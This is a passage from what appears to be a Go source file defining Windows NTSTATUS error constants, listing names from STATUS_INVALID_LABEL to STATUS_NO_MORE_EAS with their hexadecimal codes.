STATUS_INVALID_LABEL                                                      NTStatus      = 0xC0000446
STATUS_INVALID_LDT_DESCRIPTOR                                             NTStatus      = 0xC000011A
STATUS_INVALID_LDT_OFFSET                                                 NTStatus      = 0xC0000119
STATUS_INVALID_LDT_SIZE                                                   NTStatus      = 0xC0000118
STATUS_INVALID_LEVEL                                                      NTStatus      = 0xC0000148
STATUS_INVALID_LOCK_RANGE                                                 NTStatus      = 0xC00001A1
STATUS_INVALID_LOCK_SEQUENCE                                              NTStatus      = 0xC000001E
STATUS_INVALID_LOGON_HOURS                                                NTStatus      = 0xC000006F
STATUS_INVALID_LOGON_TYPE                                                 NTStatus      = 0xC000010B
STATUS_INVALID_MEMBER                                                     NTStatus      = 0xC000017B
STATUS_INVALID_MESSAGE                                                    NTStatus      = 0xC0000702
STATUS_INVALID_NETWORK_RESPONSE                                           NTStatus      = 0xC00000C3
STATUS_INVALID_OFFSET_ALIGNMENT                                           NTStatus      = 0xC0000474
STATUS_INVALID_OPLOCK_PROTOCOL                                            NTStatus      = 0xC00000E3
STATUS_INVALID_OWNER                                                      NTStatus      = 0xC000005A
STATUS_INVALID_PACKAGE_SID_LENGTH                                         NTStatus      = 0xC000A202
STATUS_INVALID_PAGE_PROTECTION                                            NTStatus      = 0xC0000045
STATUS_INVALID_PARAMETER                                                  NTStatus      = 0xC000000D
STATUS_INVALID_PARAMETER_1                                                NTStatus      = 0xC00000EF
STATUS_INVALID_PARAMETER_10                                               NTStatus      = 0xC00000F8
STATUS_INVALID_PARAMETER_11                                               NTStatus      = 0xC00000F9
STATUS_INVALID_PARAMETER_12                                               NTStatus      = 0xC00000FA
STATUS_INVALID_PARAMETER_2                                                NTStatus      = 0xC00000F0
STATUS_INVALID_PARAMETER_3                                                NTStatus      = 0xC00000F1
STATUS_INVALID_PARAMETER_4                                                NTStatus      = 0xC00000F2
STATUS_INVALID_PARAMETER_5                                                NTStatus      = 0xC00000F3
STATUS_INVALID_PARAMETER_6                                                NTStatus      = 0xC00000F4
STATUS_INVALID_PARAMETER_7                                                NTStatus      = 0xC00000F5
STATUS_INVALID_PARAMETER_8                                                NTStatus      = 0xC00000F6
STATUS_INVALID_PARAMETER_9                                                NTStatus      = 0xC00000F7
STATUS_INVALID_PARAMETER_MIX                                              NTStatus      = 0xC0000030
STATUS_INVALID_PEP_INFO_VERSION                                           NTStatus      = 0xC000A005
STATUS_INVALID_PIPE_STATE                                                 NTStatus      = 0xC00000AD
STATUS_INVALID_PLUGPLAY_DEVICE_PATH                                       NTStatus      = 0xC0000261
STATUS_INVALID_PORT_ATTRIBUTES                                            NTStatus      = 0xC000002E
STATUS_INVALID_PORT_HANDLE                                                NTStatus      = 0xC0000042
STATUS_INVALID_PRIMARY_GROUP                                              NTStatus      = 0xC000005B
STATUS_INVALID_QUOTA_LOWER                                                NTStatus      = 0xC0000031
STATUS_INVALID_READ_MODE                                                  NTStatus      = 0xC00000B4
STATUS_INVALID_RUNLEVEL_SETTING                                           NTStatus      = 0xC000A142
STATUS_INVALID_SECURITY_DESCR                                             NTStatus      = 0xC0000079
STATUS_INVALID_SERVER_STATE                                               NTStatus      = 0xC00000DC
STATUS_INVALID_SESSION                                                    NTStatus      = 0xC0000455
STATUS_INVALID_SID                                                        NTStatus      = 0xC0000078
STATUS_INVALID_SIGNATURE                                                  NTStatus      = 0xC000A000
STATUS_INVALID_STATE_TRANSITION                                           NTStatus      = 0xC000A003
STATUS_INVALID_SUB_AUTHORITY                                              NTStatus      = 0xC0000076
STATUS_INVALID_SYSTEM_SERVICE                                             NTStatus      = 0xC000001C
STATUS_INVALID_TASK_INDEX                                                 NTStatus      = 0xC0000501
STATUS_INVALID_TASK_NAME                                                  NTStatus      = 0xC0000500
STATUS_INVALID_THREAD                                                     NTStatus      = 0xC000071C
STATUS_INVALID_TOKEN                                                      NTStatus      = 0xC0000465
STATUS_INVALID_TRANSACTION                                                NTStatus      = 0xC0190002
STATUS_INVALID_UNWIND_TARGET                                              NTStatus      = 0xC0000029
STATUS_INVALID_USER_BUFFER                                                NTStatus      = 0xC00000E8
STATUS_INVALID_USER_PRINCIPAL_NAME                                        NTStatus      = 0xC000041C
STATUS_INVALID_VARIANT                                                    NTStatus      = 0xC0000232
STATUS_INVALID_VIEW_SIZE                                                  NTStatus      = 0xC000001F
STATUS_INVALID_VOLUME_LABEL                                               NTStatus      = 0xC0000086
STATUS_INVALID_WEIGHT                                                     NTStatus      = 0xC0000458
STATUS_INVALID_WORKSTATION                                                NTStatus      = 0xC0000070
STATUS_IN_PAGE_ERROR                                                      NTStatus      = 0xC0000006
STATUS_IO_DEVICE_ERROR                                                    NTStatus      = 0xC0000185
STATUS_IO_DEVICE_INVALID_DATA                                             NTStatus      = 0xC00001B0
STATUS_IO_OPERATION_TIMEOUT                                               NTStatus      = 0xC000047D
STATUS_IO_PREEMPTED                                                       NTStatus      = 0xC0510001
STATUS_IO_PRIVILEGE_FAILED                                                NTStatus      = 0xC0000137
STATUS_IO_REISSUE_AS_CACHED                                               NTStatus      = 0xC0040039
STATUS_IO_REPARSE_DATA_INVALID                                            NTStatus      = 0xC0000278
STATUS_IO_REPARSE_TAG_INVALID                                             NTStatus      = 0xC0000276
STATUS_IO_REPARSE_TAG_MISMATCH                                            NTStatus      = 0xC0000277
STATUS_IO_REPARSE_TAG_NOT_HANDLED                                         NTStatus      = 0xC0000279
STATUS_IO_TIMEOUT                                                         NTStatus      = 0xC00000B5
STATUS_IO_UNALIGNED_WRITE                                                 NTStatus      = 0xC00001B1
STATUS_IPSEC_AUTH_FIREWALL_DROP                                           NTStatus      = 0xC0360008
STATUS_IPSEC_BAD_SPI                                                      NTStatus      = 0xC0360001
STATUS_IPSEC_CLEAR_TEXT_DROP                                              NTStatus      = 0xC0360007
STATUS_IPSEC_DOSP_BLOCK                                                   NTStatus      = 0xC0368000
STATUS_IPSEC_DOSP_INVALID_PACKET                                          NTStatus      = 0xC0368002
STATUS_IPSEC_DOSP_KEYMOD_NOT_ALLOWED                                      NTStatus      = 0xC0368005
STATUS_IPSEC_DOSP_MAX_ENTRIES                                             NTStatus      = 0xC0368004
STATUS_IPSEC_DOSP_MAX_PER_IP_RATELIMIT_QUEUES                             NTStatus      = 0xC0368006
STATUS_IPSEC_DOSP_RECEIVED_MULTICAST                                      NTStatus      = 0xC0368001
STATUS_IPSEC_DOSP_STATE_LOOKUP_FAILED                                     NTStatus      = 0xC0368003
STATUS_IPSEC_INTEGRITY_CHECK_FAILED                                       NTStatus      = 0xC0360006
STATUS_IPSEC_INVALID_PACKET                                               NTStatus      = 0xC0360005
STATUS_IPSEC_QUEUE_OVERFLOW                                               NTStatus      = 0xC000A010
STATUS_IPSEC_REPLAY_CHECK_FAILED                                          NTStatus      = 0xC0360004
STATUS_IPSEC_SA_LIFETIME_EXPIRED                                          NTStatus      = 0xC0360002
STATUS_IPSEC_THROTTLE_DROP                                                NTStatus      = 0xC0360009
STATUS_IPSEC_WRONG_SA                                                     NTStatus      = 0xC0360003
STATUS_IP_ADDRESS_CONFLICT1                                               NTStatus      = 0xC0000254
STATUS_IP_ADDRESS_CONFLICT2                                               NTStatus      = 0xC0000255
STATUS_ISSUING_CA_UNTRUSTED                                               NTStatus      = 0xC000038A
STATUS_ISSUING_CA_UNTRUSTED_KDC                                           NTStatus      = 0xC000040D
STATUS_JOB_NOT_EMPTY                                                      NTStatus      = 0xC000050F
STATUS_JOB_NO_CONTAINER                                                   NTStatus      = 0xC0000509
STATUS_JOURNAL_DELETE_IN_PROGRESS                                         NTStatus      = 0xC00002B7
STATUS_JOURNAL_ENTRY_DELETED                                              NTStatus      = 0xC00002CF
STATUS_JOURNAL_NOT_ACTIVE                                                 NTStatus      = 0xC00002B8
STATUS_KDC_CERT_EXPIRED                                                   NTStatus      = 0xC000040E
STATUS_KDC_CERT_REVOKED                                                   NTStatus      = 0xC000040F
STATUS_KDC_INVALID_REQUEST                                                NTStatus      = 0xC00002FB
STATUS_KDC_UNABLE_TO_REFER                                                NTStatus      = 0xC00002FC
STATUS_KDC_UNKNOWN_ETYPE                                                  NTStatus      = 0xC00002FD
STATUS_KERNEL_APC                                                         NTStatus      = 0x00000100
STATUS_KERNEL_EXECUTABLE_MEMORY_WRITE                                     NTStatus      = 0xC0000724
STATUS_KEY_DELETED                                                        NTStatus      = 0xC000017C
STATUS_KEY_HAS_CHILDREN                                                   NTStatus      = 0xC0000180
STATUS_LAST_ADMIN                                                         NTStatus      = 0xC0000069
STATUS_LICENSE_QUOTA_EXCEEDED                                             NTStatus      = 0xC0000259
STATUS_LICENSE_VIOLATION                                                  NTStatus      = 0xC000026A
STATUS_LINK_FAILED                                                        NTStatus      = 0xC000013E
STATUS_LINK_TIMEOUT                                                       NTStatus      = 0xC000013F
STATUS_LM_CROSS_ENCRYPTION_REQUIRED                                       NTStatus      = 0xC000017F
STATUS_LOCAL_DISCONNECT                                                   NTStatus      = 0xC000013B
STATUS_LOCAL_USER_SESSION_KEY                                             NTStatus      = 0x40000006
STATUS_LOCK_NOT_GRANTED                                                   NTStatus      = 0xC0000055
STATUS_LOGIN_TIME_RESTRICTION                                             NTStatus      = 0xC0000247
STATUS_LOGIN_WKSTA_RESTRICTION                                            NTStatus      = 0xC0000248
STATUS_LOGON_FAILURE                                                      NTStatus      = 0xC000006D
STATUS_LOGON_NOT_GRANTED                                                  NTStatus      = 0xC0000155
STATUS_LOGON_SERVER_CONFLICT                                              NTStatus      = 0xC0000132
STATUS_LOGON_SESSION_COLLISION                                            NTStatus      = 0xC0000105
STATUS_LOGON_SESSION_EXISTS                                               NTStatus      = 0xC00000EE
STATUS_LOGON_TYPE_NOT_GRANTED                                             NTStatus      = 0xC000015B
STATUS_LOG_APPENDED_FLUSH_FAILED                                          NTStatus      = 0xC01A002F
STATUS_LOG_ARCHIVE_IN_PROGRESS                                            NTStatus      = 0xC01A0021
STATUS_LOG_ARCHIVE_NOT_IN_PROGRESS                                        NTStatus      = 0xC01A0020
STATUS_LOG_BLOCKS_EXHAUSTED                                               NTStatus      = 0xC01A0006
STATUS_LOG_BLOCK_INCOMPLETE                                               NTStatus      = 0xC01A0004
STATUS_LOG_BLOCK_INVALID                                                  NTStatus      = 0xC01A000A
STATUS_LOG_BLOCK_VERSION                                                  NTStatus      = 0xC01A0009
STATUS_LOG_CANT_DELETE                                                    NTStatus      = 0xC01A0011
STATUS_LOG_CLIENT_ALREADY_REGISTERED                                      NTStatus      = 0xC01A0024
STATUS_LOG_CLIENT_NOT_REGISTERED                                          NTStatus      = 0xC01A0025
STATUS_LOG_CONTAINER_LIMIT_EXCEEDED                                       NTStatus      = 0xC01A0012
STATUS_LOG_CONTAINER_OPEN_FAILED                                          NTStatus      = 0xC01A0029
STATUS_LOG_CONTAINER_READ_FAILED                                          NTStatus      = 0xC01A0027
STATUS_LOG_CONTAINER_STATE_INVALID                                        NTStatus      = 0xC01A002A
STATUS_LOG_CONTAINER_WRITE_FAILED                                         NTStatus      = 0xC01A0028
STATUS_LOG_CORRUPTION_DETECTED                                            NTStatus      = 0xC0190030
STATUS_LOG_DEDICATED                                                      NTStatus      = 0xC01A001F
STATUS_LOG_EPHEMERAL                                                      NTStatus      = 0xC01A0022
STATUS_LOG_FILE_FULL                                                      NTStatus      = 0xC0000188
STATUS_LOG_FULL                                                           NTStatus      = 0xC01A001D
STATUS_LOG_FULL_HANDLER_IN_PROGRESS                                       NTStatus      = 0xC01A0026
STATUS_LOG_GROWTH_FAILED                                                  NTStatus      = 0xC0190019
STATUS_LOG_HARD_ERROR                                                     NTStatus      = 0x4000001A
STATUS_LOG_INCONSISTENT_SECURITY                                          NTStatus      = 0xC01A002E
STATUS_LOG_INVALID_RANGE                                                  NTStatus      = 0xC01A0005
STATUS_LOG_METADATA_CORRUPT                                               NTStatus      = 0xC01A000D
STATUS_LOG_METADATA_FLUSH_FAILED                                          NTStatus      = 0xC01A002D
STATUS_LOG_METADATA_INCONSISTENT                                          NTStatus      = 0xC01A000F
STATUS_LOG_METADATA_INVALID                                               NTStatus      = 0xC01A000E
STATUS_LOG_MULTIPLEXED                                                    NTStatus      = 0xC01A001E
STATUS_LOG_NOT_ENOUGH_CONTAINERS                                          NTStatus      = 0xC01A0023
STATUS_LOG_NO_RESTART                                                     NTStatus      = 0x401A000C
STATUS_LOG_PINNED                                                         NTStatus      = 0xC01A002C
STATUS_LOG_PINNED_ARCHIVE_TAIL                                            NTStatus      = 0xC01A0018
STATUS_LOG_PINNED_RESERVATION                                             NTStatus      = 0xC01A0030
STATUS_LOG_POLICY_ALREADY_INSTALLED                                       NTStatus      = 0xC01A0014
STATUS_LOG_POLICY_CONFLICT                                                NTStatus      = 0xC01A0017
STATUS_LOG_POLICY_INVALID                                                 NTStatus      = 0xC01A0016
STATUS_LOG_POLICY_NOT_INSTALLED                                           NTStatus      = 0xC01A0015
STATUS_LOG_READ_CONTEXT_INVALID                                           NTStatus      = 0xC01A0007
STATUS_LOG_READ_MODE_INVALID                                              NTStatus      = 0xC01A000B
STATUS_LOG_RECORDS_RESERVED_INVALID                                       NTStatus      = 0xC01A001A
STATUS_LOG_RECORD_NONEXISTENT                                             NTStatus      = 0xC01A0019
STATUS_LOG_RESERVATION_INVALID                                            NTStatus      = 0xC01A0010
STATUS_LOG_RESIZE_INVALID_SIZE                                            NTStatus      = 0xC019000B
STATUS_LOG_RESTART_INVALID                                                NTStatus      = 0xC01A0008
STATUS_LOG_SECTOR_INVALID                                                 NTStatus      = 0xC01A0001
STATUS_LOG_SECTOR_PARITY_INVALID                                          NTStatus      = 0xC01A0002
STATUS_LOG_SECTOR_REMAPPED                                                NTStatus      = 0xC01A0003
STATUS_LOG_SPACE_RESERVED_INVALID                                         NTStatus      = 0xC01A001B
STATUS_LOG_START_OF_LOG                                                   NTStatus      = 0xC01A0013
STATUS_LOG_STATE_INVALID                                                  NTStatus      = 0xC01A002B
STATUS_LOG_TAIL_INVALID                                                   NTStatus      = 0xC01A001C
STATUS_LONGJUMP                                                           NTStatus      = 0x80000026
STATUS_LOST_MODE_LOGON_RESTRICTION                                        NTStatus      = 0xC000030D
STATUS_LOST_WRITEBEHIND_DATA                                              NTStatus      = 0xC0000222
STATUS_LOST_WRITEBEHIND_DATA_LOCAL_DISK_ERROR                             NTStatus      = 0xC000A082
STATUS_LOST_WRITEBEHIND_DATA_NETWORK_DISCONNECTED                         NTStatus      = 0xC000A080
STATUS_LOST_WRITEBEHIND_DATA_NETWORK_SERVER_ERROR                         NTStatus      = 0xC000A081
STATUS_LPAC_ACCESS_DENIED                                                 NTStatus      = 0xC000A203
STATUS_LPC_HANDLE_COUNT_EXCEEDED                                          NTStatus      = 0xC0000722
STATUS_LPC_INVALID_CONNECTION_USAGE                                       NTStatus      = 0xC0000706
STATUS_LPC_RECEIVE_BUFFER_EXPECTED                                        NTStatus      = 0xC0000705
STATUS_LPC_REPLY_LOST                                                     NTStatus      = 0xC0000253
STATUS_LPC_REQUESTS_NOT_ALLOWED                                           NTStatus      = 0xC0000707
STATUS_LUIDS_EXHAUSTED                                                    NTStatus      = 0xC0000075
STATUS_MAGAZINE_NOT_PRESENT                                               NTStatus      = 0xC0000286
STATUS_MAPPED_ALIGNMENT                                                   NTStatus      = 0xC0000220
STATUS_MAPPED_FILE_SIZE_ZERO                                              NTStatus      = 0xC000011E
STATUS_MARKED_TO_DISALLOW_WRITES                                          NTStatus      = 0xC000048D
STATUS_MARSHALL_OVERFLOW                                                  NTStatus      = 0xC0000231
STATUS_MAX_REFERRALS_EXCEEDED                                             NTStatus      = 0xC00002F4
STATUS_MCA_EXCEPTION                                                      NTStatus      = 0xC0000713
STATUS_MCA_OCCURED                                                        NTStatus      = 0xC000036A
STATUS_MEDIA_CHANGED                                                      NTStatus      = 0x8000001C
STATUS_MEDIA_CHECK                                                        NTStatus      = 0x80000020
STATUS_MEDIA_WRITE_PROTECTED                                              NTStatus      = 0xC00000A2
STATUS_MEMBERS_PRIMARY_GROUP                                              NTStatus      = 0xC0000127
STATUS_MEMBER_IN_ALIAS                                                    NTStatus      = 0xC0000153
STATUS_MEMBER_IN_GROUP                                                    NTStatus      = 0xC0000067
STATUS_MEMBER_NOT_IN_ALIAS                                                NTStatus      = 0xC0000152
STATUS_MEMBER_NOT_IN_GROUP                                                NTStatus      = 0xC0000068
STATUS_MEMORY_NOT_ALLOCATED                                               NTStatus      = 0xC00000A0
STATUS_MESSAGE_LOST                                                       NTStatus      = 0xC0000701
STATUS_MESSAGE_NOT_FOUND                                                  NTStatus      = 0xC0000109
STATUS_MESSAGE_RETRIEVED                                                  NTStatus      = 0x4000002E
STATUS_MFT_TOO_FRAGMENTED                                                 NTStatus      = 0xC0000304
STATUS_MINIVERSION_INACCESSIBLE_FROM_SPECIFIED_TRANSACTION                NTStatus      = 0xC0190024
STATUS_MISSING_SYSTEMFILE                                                 NTStatus      = 0xC0000143
STATUS_MONITOR_INVALID_DESCRIPTOR_CHECKSUM                                NTStatus      = 0xC01D0003
STATUS_MONITOR_INVALID_DETAILED_TIMING_BLOCK                              NTStatus      = 0xC01D0009
STATUS_MONITOR_INVALID_MANUFACTURE_DATE                                   NTStatus      = 0xC01D000A
STATUS_MONITOR_INVALID_SERIAL_NUMBER_MONDSC_BLOCK                         NTStatus      = 0xC01D0006
STATUS_MONITOR_INVALID_STANDARD_TIMING_BLOCK                              NTStatus      = 0xC01D0004
STATUS_MONITOR_INVALID_USER_FRIENDLY_MONDSC_BLOCK                         NTStatus      = 0xC01D0007
STATUS_MONITOR_NO_DESCRIPTOR                                              NTStatus      = 0xC01D0001
STATUS_MONITOR_NO_MORE_DESCRIPTOR_DATA                                    NTStatus      = 0xC01D0008
STATUS_MONITOR_UNKNOWN_DESCRIPTOR_FORMAT                                  NTStatus      = 0xC01D0002
STATUS_MONITOR_WMI_DATABLOCK_REGISTRATION_FAILED                          NTStatus      = 0xC01D0005
STATUS_MORE_ENTRIES                                                       NTStatus      = 0x00000105
STATUS_MORE_PROCESSING_REQUIRED                                           NTStatus      = 0xC0000016
STATUS_MOUNT_POINT_NOT_RESOLVED                                           NTStatus      = 0xC0000368
STATUS_MP_PROCESSOR_MISMATCH                                              NTStatus      = 0x40000029
STATUS_MUI_FILE_NOT_FOUND                                                 NTStatus      = 0xC00B0001
STATUS_MUI_FILE_NOT_LOADED                                                NTStatus      = 0xC00B0006
STATUS_MUI_INVALID_FILE                                                   NTStatus      = 0xC00B0002
STATUS_MUI_INVALID_LOCALE_NAME                                            NTStatus      = 0xC00B0004
STATUS_MUI_INVALID_RC_CONFIG                                              NTStatus      = 0xC00B0003
STATUS_MUI_INVALID_ULTIMATEFALLBACK_NAME                                  NTStatus      = 0xC00B0005
STATUS_MULTIPLE_FAULT_VIOLATION                                           NTStatus      = 0xC00002E8
STATUS_MUST_BE_KDC                                                        NTStatus      = 0xC00002F5
STATUS_MUTANT_LIMIT_EXCEEDED                                              NTStatus      = 0xC0000191
STATUS_MUTANT_NOT_OWNED                                                   NTStatus      = 0xC0000046
STATUS_MUTUAL_AUTHENTICATION_FAILED                                       NTStatus      = 0xC00002C3
STATUS_NAME_TOO_LONG                                                      NTStatus      = 0xC0000106
STATUS_NDIS_ADAPTER_NOT_FOUND                                             NTStatus      = 0xC0230006
STATUS_NDIS_ADAPTER_NOT_READY                                             NTStatus      = 0xC0230011
STATUS_NDIS_ADAPTER_REMOVED                                               NTStatus      = 0xC0230018
STATUS_NDIS_ALREADY_MAPPED                                                NTStatus      = 0xC023001D
STATUS_NDIS_BAD_CHARACTERISTICS                                           NTStatus      = 0xC0230005
STATUS_NDIS_BAD_VERSION                                                   NTStatus      = 0xC0230004
STATUS_NDIS_BUFFER_TOO_SHORT                                              NTStatus      = 0xC0230016
STATUS_NDIS_CLOSING                                                       NTStatus      = 0xC0230002
STATUS_NDIS_DEVICE_FAILED                                                 NTStatus      = 0xC0230008
STATUS_NDIS_DOT11_AP_BAND_CURRENTLY_NOT_AVAILABLE                         NTStatus      = 0xC0232006
STATUS_NDIS_DOT11_AP_BAND_NOT_ALLOWED                                     NTStatus      = 0xC0232008
STATUS_NDIS_DOT11_AP_CHANNEL_CURRENTLY_NOT_AVAILABLE                      NTStatus      = 0xC0232005
STATUS_NDIS_DOT11_AP_CHANNEL_NOT_ALLOWED                                  NTStatus      = 0xC0232007
STATUS_NDIS_DOT11_AUTO_CONFIG_ENABLED                                     NTStatus      = 0xC0232000
STATUS_NDIS_DOT11_MEDIA_IN_USE                                            NTStatus      = 0xC0232001
STATUS_NDIS_DOT11_POWER_STATE_INVALID                                     NTStatus      = 0xC0232002
STATUS_NDIS_ERROR_READING_FILE                                            NTStatus      = 0xC023001C
STATUS_NDIS_FILE_NOT_FOUND                                                NTStatus      = 0xC023001B
STATUS_NDIS_GROUP_ADDRESS_IN_USE                                          NTStatus      = 0xC023001A
STATUS_NDIS_INDICATION_REQUIRED                                           NTStatus      = 0x40230001
STATUS_NDIS_INTERFACE_NOT_FOUND                                           NTStatus      = 0xC023002B
STATUS_NDIS_INVALID_ADDRESS                                               NTStatus      = 0xC0230022
STATUS_NDIS_INVALID_DATA                                                  NTStatus      = 0xC0230015
STATUS_NDIS_INVALID_DEVICE_REQUEST                                        NTStatus      = 0xC0230010
STATUS_NDIS_INVALID_LENGTH                                                NTStatus      = 0xC0230014
STATUS_NDIS_INVALID_OID                                                   NTStatus      = 0xC0230017
STATUS_NDIS_INVALID_PACKET                                                NTStatus      = 0xC023000F
STATUS_NDIS_INVALID_PORT                                                  NTStatus      = 0xC023002D
STATUS_NDIS_INVALID_PORT_STATE                                            NTStatus      = 0xC023002E
STATUS_NDIS_LOW_POWER_STATE                                               NTStatus      = 0xC023002F
STATUS_NDIS_MEDIA_DISCONNECTED                                            NTStatus      = 0xC023001F
STATUS_NDIS_MULTICAST_EXISTS                                              NTStatus      = 0xC023000A
STATUS_NDIS_MULTICAST_FULL                                                NTStatus      = 0xC0230009
STATUS_NDIS_MULTICAST_NOT_FOUND                                           NTStatus      = 0xC023000B
STATUS_NDIS_NOT_SUPPORTED                                                 NTStatus      = 0xC02300BB
STATUS_NDIS_NO_QUEUES                                                     NTStatus      = 0xC0230031
STATUS_NDIS_OFFLOAD_CONNECTION_REJECTED                                   NTStatus      = 0xC0231012
STATUS_NDIS_OFFLOAD_PATH_REJECTED                                         NTStatus      = 0xC0231013
STATUS_NDIS_OFFLOAD_POLICY                                                NTStatus      = 0xC023100F
STATUS_NDIS_OPEN_FAILED                                                   NTStatus      = 0xC0230007
STATUS_NDIS_PAUSED                                                        NTStatus      = 0xC023002A
STATUS_NDIS_PM_PROTOCOL_OFFLOAD_LIST_FULL                                 NTStatus      = 0xC0232004
STATUS_NDIS_PM_WOL_PATTERN_LIST_FULL                                      NTStatus      = 0xC0232003
STATUS_NDIS_REINIT_REQUIRED                                               NTStatus      = 0xC0230030
STATUS_NDIS_REQUEST_ABORTED                                               NTStatus      = 0xC023000C
STATUS_NDIS_RESET_IN_PROGRESS                                             NTStatus      = 0xC023000D
STATUS_NDIS_RESOURCE_CONFLICT                                             NTStatus      = 0xC023001E
STATUS_NDIS_UNSUPPORTED_MEDIA                                             NTStatus      = 0xC0230019
STATUS_NDIS_UNSUPPORTED_REVISION                                          NTStatus      = 0xC023002C
STATUS_ND_QUEUE_OVERFLOW                                                  NTStatus      = 0xC000A011
STATUS_NEEDS_REGISTRATION                                                 NTStatus      = 0xC0000489
STATUS_NEEDS_REMEDIATION                                                  NTStatus      = 0xC0000462
STATUS_NETLOGON_NOT_STARTED                                               NTStatus      = 0xC0000192
STATUS_NETWORK_ACCESS_DENIED                                              NTStatus      = 0xC00000CA
STATUS_NETWORK_ACCESS_DENIED_EDP                                          NTStatus      = 0xC000048E
STATUS_NETWORK_BUSY                                                       NTStatus      = 0xC00000BF
STATUS_NETWORK_CREDENTIAL_CONFLICT                                        NTStatus      = 0xC0000195
STATUS_NETWORK_NAME_DELETED                                               NTStatus      = 0xC00000C9
STATUS_NETWORK_OPEN_RESTRICTION                                           NTStatus      = 0xC0000201
STATUS_NETWORK_SESSION_EXPIRED                                            NTStatus      = 0xC000035C
STATUS_NETWORK_UNREACHABLE                                                NTStatus      = 0xC000023C
STATUS_NET_WRITE_FAULT                                                    NTStatus      = 0xC00000D2
STATUS_NOINTERFACE                                                        NTStatus      = 0xC00002B9
STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT                                  NTStatus      = 0xC0000198
STATUS_NOLOGON_SERVER_TRUST_ACCOUNT                                       NTStatus      = 0xC000019A
STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT                                  NTStatus      = 0xC0000199
STATUS_NONCONTINUABLE_EXCEPTION                                           NTStatus      = 0xC0000025
STATUS_NONEXISTENT_EA_ENTRY                                               NTStatus      = 0xC0000051
STATUS_NONEXISTENT_SECTOR                                                 NTStatus      = 0xC0000015
STATUS_NONE_MAPPED                                                        NTStatus      = 0xC0000073
STATUS_NOTHING_TO_TERMINATE                                               NTStatus      = 0x00000122
STATUS_NOTIFICATION_GUID_ALREADY_DEFINED                                  NTStatus      = 0xC00001A4
STATUS_NOTIFY_CLEANUP                                                     NTStatus      = 0x0000010B
STATUS_NOTIFY_ENUM_DIR                                                    NTStatus      = 0x0000010C
STATUS_NOT_ALLOWED_ON_SYSTEM_FILE                                         NTStatus      = 0xC00001A7
STATUS_NOT_ALL_ASSIGNED                                                   NTStatus      = 0x00000106
STATUS_NOT_APPCONTAINER                                                   NTStatus      = 0xC000A200
STATUS_NOT_A_CLOUD_FILE                                                   NTStatus      = 0xC000CF07
STATUS_NOT_A_CLOUD_SYNC_ROOT                                              NTStatus      = 0xC000CF1E
STATUS_NOT_A_DAX_VOLUME                                                   NTStatus      = 0xC00004B1
STATUS_NOT_A_DIRECTORY                                                    NTStatus      = 0xC0000103
STATUS_NOT_A_REPARSE_POINT                                                NTStatus      = 0xC0000275
STATUS_NOT_A_TIERED_VOLUME                                                NTStatus      = 0xC000050D
STATUS_NOT_CAPABLE                                                        NTStatus      = 0xC0000429
STATUS_NOT_CLIENT_SESSION                                                 NTStatus      = 0xC0000217
STATUS_NOT_COMMITTED                                                      NTStatus      = 0xC000002D
STATUS_NOT_DAX_MAPPABLE                                                   NTStatus      = 0xC00004B2
STATUS_NOT_EXPORT_FORMAT                                                  NTStatus      = 0xC0000292
STATUS_NOT_FOUND                                                          NTStatus      = 0xC0000225
STATUS_NOT_GUI_PROCESS                                                    NTStatus      = 0xC0000506
STATUS_NOT_IMPLEMENTED                                                    NTStatus      = 0xC0000002
STATUS_NOT_LOCKED                                                         NTStatus      = 0xC000002A
STATUS_NOT_LOGON_PROCESS                                                  NTStatus      = 0xC00000ED
STATUS_NOT_MAPPED_DATA                                                    NTStatus      = 0xC0000088
STATUS_NOT_MAPPED_VIEW                                                    NTStatus      = 0xC0000019
STATUS_NOT_READ_FROM_COPY                                                 NTStatus      = 0xC000046A
STATUS_NOT_REDUNDANT_STORAGE                                              NTStatus      = 0xC0000479
STATUS_NOT_REGISTRY_FILE                                                  NTStatus      = 0xC000015C
STATUS_NOT_SAFE_MODE_DRIVER                                               NTStatus      = 0xC000035F
STATUS_NOT_SAME_DEVICE                                                    NTStatus      = 0xC00000D4
STATUS_NOT_SAME_OBJECT                                                    NTStatus      = 0xC00001AC
STATUS_NOT_SERVER_SESSION                                                 NTStatus      = 0xC0000216
STATUS_NOT_SNAPSHOT_VOLUME                                                NTStatus      = 0xC0190047
STATUS_NOT_SUPPORTED                                                      NTStatus      = 0xC00000BB
STATUS_NOT_SUPPORTED_IN_APPCONTAINER                                      NTStatus      = 0xC000A201
STATUS_NOT_SUPPORTED_ON_DAX                                               NTStatus      = 0xC000049A
STATUS_NOT_SUPPORTED_ON_SBS                                               NTStatus      = 0xC0000300
STATUS_NOT_SUPPORTED_WITH_BTT                                             NTStatus      = 0xC00004B5
STATUS_NOT_TINY_STREAM                                                    NTStatus      = 0xC0000226
STATUS_NO_ACE_CONDITION                                                   NTStatus      = 0x8000002F
STATUS_NO_APPLICABLE_APP_LICENSES_FOUND                                   NTStatus      = 0xC0EA0001
STATUS_NO_APPLICATION_PACKAGE                                             NTStatus      = 0xC00001AA
STATUS_NO_BROWSER_SERVERS_FOUND                                           NTStatus      = 0xC000021C
STATUS_NO_CALLBACK_ACTIVE                                                 NTStatus      = 0xC0000258
STATUS_NO_DATA_DETECTED                                                   NTStatus      = 0x80000022
STATUS_NO_EAS_ON_FILE                                                     NTStatus      = 0xC0000052
STATUS_NO_EFS                                                             NTStatus      = 0xC000028E
STATUS_NO_EVENT_PAIR                                                      NTStatus      = 0xC000014E
STATUS_NO_GUID_TRANSLATION                                                NTStatus      = 0xC000010C
STATUS_NO_IMPERSONATION_TOKEN                                             NTStatus      = 0xC000005C
STATUS_NO_INHERITANCE                                                     NTStatus      = 0x8000000B
STATUS_NO_IP_ADDRESSES                                                    NTStatus      = 0xC00002F1
STATUS_NO_KERB_KEY                                                        NTStatus      = 0xC0000322
STATUS_NO_KEY                                                             NTStatus      = 0xC000090C
STATUS_NO_LDT                                                             NTStatus      = 0xC0000117
STATUS_NO_LINK_TRACKING_IN_TRANSACTION                                    NTStatus      = 0xC0190059
STATUS_NO_LOGON_SERVERS                                                   NTStatus      = 0xC000005E
STATUS_NO_LOG_SPACE                                                       NTStatus      = 0xC000017D
STATUS_NO_MATCH                                                           NTStatus      = 0xC0000272
STATUS_NO_MEDIA                                                           NTStatus      = 0xC0000178
STATUS_NO_MEDIA_IN_DEVICE                                                 NTStatus      = 0xC0000013
STATUS_NO_MEMORY                                                          NTStatus      = 0xC0000017
STATUS_NO_MORE_EAS                                                        NTStatus      = 0x80000012
